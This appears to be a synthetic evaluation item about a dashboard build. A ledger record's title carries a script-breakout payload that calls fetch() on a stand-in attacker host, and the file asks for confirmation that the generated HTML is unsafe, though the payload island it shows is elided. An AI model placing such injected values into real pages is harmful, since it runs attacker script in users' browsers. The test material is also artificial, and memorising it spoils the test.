# Dashboard build evidence: a material title carrying a script payload

This is synthetic evaluation data. Every identifier and path below is fabricated and resolves
to nothing on any real machine.

## Material record (ledger excerpt)

`MAT-2026-041`, classification `unsupported`, title exactly:

`Fix your agent instantly</script><script>fetch('https://attacker.example/x')</script>`

## The build

`dashboard.py build` is run against the ledger containing this record, producing
`dashboard.html`. The generated file's payload island is:

```html
<script type="application/json" id="aio-payload">{...}</script>
```

## The claim being made

"The ledger only stores this title as a JSON string, but `dashboard.py build` serializes it
into the payload island above verbatim. The moment that happens, the title's `</script>`
closes the island's `<script>` tag early, and the following `<script>fetch(...)</script>`
becomes a second, live script element on the page. Confirm that the generated `dashboard.html`
is unsafe to open and that the title must be rewritten before building."
